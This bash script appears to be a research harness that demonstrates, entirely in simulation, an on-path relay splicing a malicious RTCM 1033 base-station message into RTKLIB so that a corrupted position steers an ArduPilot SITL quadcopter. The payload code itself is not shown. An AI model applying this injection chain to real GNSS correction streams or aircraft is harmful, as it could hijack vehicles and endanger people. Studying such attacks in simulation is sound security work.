#!/bin/bash
# Packet to propeller: one continuous chain.
#
#   SITL truth --> gnss_sim --> [relay: splices the malicious 1033]
#                                    |
#                              RTKLIB (rtksvr)
#                                    |
#                                  NMEA
#                                    |
#                              SITL's GPS --> vehicle moves
#
# The aircraft's own position becomes the observations RTKLIB solves, and
# RTKLIB's solution is the aircraft's only GPS. So a corrupted base-station
# coordinate propagates all the way back into the flight control loop.
#
#   BIN=~/apsitl/arducopter RTKLIB=<checkout> ./loop_demo.sh [rectype_len]
#
# Startup order matters and runs BACKWARDS along the data flow: every server
# must be listening before its client starts. SITL gives up on its GPS port
# after ~11 retries and exits, which collapses the whole chain. The position
# feed is decoupled through a FIFO so gnss_sim can bind its ports before SITL
# (and therefore the feed) exists.
#
# No `set -e`: pieces come and go as the loop converges.

RTKLIB="${RTKLIB:?set RTKLIB to your RTKLIB checkout}"
BIN="${BIN:-$HOME/apsitl/arducopter}"
LEN="${1:-212}"
DELAY="${DELAY:-50}"        # seconds of clean flight before injecting
# Must outlast the whole profile: ~40 s of staged startup, then EKF settle,
# arm and takeoff, then hold + attack + goto + land. If the streams stop
# first, SITL loses its GPS mid-flight and the run ends in a connection reset
# rather than a measurement.
RUN="${RUN:-260}"           # total seconds
HERE="$(cd "$(dirname "$0")" && pwd)"
T="${T:-/tmp/rtk-loop}"
mkdir -p "$T"
export LIBC_FATAL_STDERR_=1

BASE_ECEF=-3978242.4348,3382841.1715,3649902.7667
HOME_LLH=$(python3 -c "
import math
a=6378137.0; f=1/298.257223563; e2=f*(2-f)
x,y,z=(-3978242.4348,3382841.1715,3649902.7667)
lon=math.atan2(y,x); p=math.hypot(x,y); lat=math.atan2(z,p*(1-e2))
for _ in range(8):
    N=a/math.sqrt(1-e2*math.sin(lat)**2); h=p/math.cos(lat)-N
    lat=math.atan2(z,p*(1-e2*N/(N+h)))
print(f'{math.degrees(lat):.9f},{math.degrees(lon):.9f},{h:.4f}')")
echo "base/home: $HOME_LLH"

cleanup() {
    for p in arducopter gnss_sim e2e_loop; do pkill -x $p 2>/dev/null; done
    pkill -f inject_relay 2>/dev/null
    pkill -f mav_pos 2>/dev/null
    [ -n "${holder:-}" ] && kill "$holder" 2>/dev/null
}
cleanup; sleep 1

echo "### building ###"
gcc -I "$RTKLIB/src" -O2 -o "$T/gnss_sim" "$HERE/gnss_sim.c" \
    "$RTKLIB"/src/*.c "$RTKLIB"/src/rcv/*.c -lm -lpthread 2>&1 | grep -Ei '\berror\b'
gcc -I "$RTKLIB/src" -O2 -U_FORTIFY_SOURCE -o "$T/e2e_loop" "$HERE/e2e_harness.c" \
    "$RTKLIB"/src/*.c "$RTKLIB"/src/rcv/*.c -lm -lpthread 2>&1 | grep -Ei '\berror\b'
[ -x "$T/gnss_sim" ] && [ -x "$T/e2e_loop" ] || { echo "build failed"; exit 1; }

cat > "$T/loop.parm" <<'EOF'
ARMING_CHECK 0
FRAME_CLASS 1
GPS_TYPE 5
GPS1_TYPE 5
SIM_GPS1_ENABLE 0
SERIAL3_PROTOCOL 5
SR0_POSITION 10
SR0_EXTRA1 10
SR0_EXTRA3 10
SR0_EXT_STAT 10
SR1_POSITION 10
SR1_EXTRA1 10
SR1_EXTRA3 10
SR1_EXT_STAT 10
EK3_SRC1_VELXY 0
EOF

AP_DEF="$HOME/ardupilot/Tools/autotest/default_params/copter.parm"
[ -f "$AP_DEF" ] && DEFAULTS="$AP_DEF,$T/loop.parm" || DEFAULTS="$T/loop.parm"

cd "$T" || exit 1
rm -f eeprom.bin pos.fifo
mkfifo pos.fifo
# Hold the write end open so gnss_sim's read does not see EOF before the
# position feed starts.
sleep "$((RUN + 60))" > pos.fifo &
holder=$!

echo "### 1. observable synthesiser (binds :5901 base, :5902 rover) ###"
"$T/gnss_sim" "$RTKLIB/test/data/rinex/07590920.05n" "$BASE_ECEF" \
    --live :5901 :5902 5 < pos.fifo > "$T/sim.log" 2>&1 &
# Generous settles: each stage must be listening before the next connects,
# and a client that gives up takes the rest of the chain down with it.
sleep 8

echo "### 2. on-path relay :5911 -> :5901 (clean ${DELAY}s, then injects) ###"
python3 "$HERE/inject_relay.py" --listen 5911 --upstream 127.0.0.1:5901 \
    --len "$LEN" --delay "$DELAY" > "$T/relay.log" 2>&1 &
sleep 4

# RTKLIB emits RMC with a speed of 0.00 no matter how fast the rover is moving
# -- measured at a known 1 m/s, and prcopt.dynamics does NOT change it, so the
# solution carries no velocity to format. An autopilot fusing that is being told
# it is stationary mid-flight, which destabilises it with no attack involved, so
# EK3_SRC1_VELXY above stops the EKF using GPS velocity at all. DYNAMICS is kept
# as a knob because the harness prints the solution speed and it is the thing to
# re-check if this is ever fixed upstream.
echo "### 3. RTKLIB: rover :5902, base via relay :5911, NMEA out :5903 ###"
DYNAMICS=1 NMEA_TCP=:5903 "$T/e2e_loop" 127.0.0.1:5902 127.0.0.1:5911 "$RUN" 1 tcp \
    > "$T/rtklib.log" 2>&1 &
sleep 6

echo "### 4. SITL, taking its GPS from RTKLIB ###"
# Two MAVLink endpoints, not one. SERIAL0 takes a single client at a time, so
# the position feed and the flight driver sharing :5760 means whichever
# connects second gets EOF -- which looks exactly like a vehicle that will not
# arm. The feed gets SERIAL1, the flight driver keeps SERIAL0.
"$BIN" --model quad --home "$HOME_LLH,0" --defaults "$DEFAULTS" \
       --serial0 tcp:5760 --serial1 tcp:5762 \
       --serial3 tcpclient:127.0.0.1:5903 \
       > "$T/sitl.log" 2>&1 &
sleep 12

echo "### 5. position feed: SITL truth -> synthesiser (SERIAL1 :5762) ###"
python3 "$HERE/mav_pos.py" --conn tcp:127.0.0.1:5762 --rate 5 \
        --seconds "$RUN" > pos.fifo 2>"$T/mavpos.log" &
sleep 10

echo
echo "### flying ###"
# --no-glitch: the offset must reach the aircraft only through the corrupted
# base coordinate, so the flight driver injects nothing of its own.
python3 "$HERE/ardupilot_demo.py" --conn tcp:127.0.0.1:5760 --no-glitch \
        --hold 25 --attack 40 --goto-time 55 2>&1 | tee "$T/flight.log" | tail -20

sleep 3
cleanup
wait 2>/dev/null

echo
echo "### relay ###";  tail -4 "$T/relay.log"
echo "### RTKLIB ###"; grep -E '^[0-9]{2}:|solutions emitted|final base' "$T/rtklib.log" | tail -6
LOG=$(ls -t "$T"/logs/*.BIN 2>/dev/null | head -1)
# The waypoint is chosen at runtime from wherever the aircraft was holding,
# so the parser has to be told which coordinate was actually commanded.
WP=$(sed -n 's/^waypoint: //p' "$T/flight.log" | tail -1)
[ -n "$LOG" ] && { echo; echo "### aircraft ###";
    python3 "$HERE/parse_sitl_log.py" "$LOG" ${WP:+--target "$WP"}; }
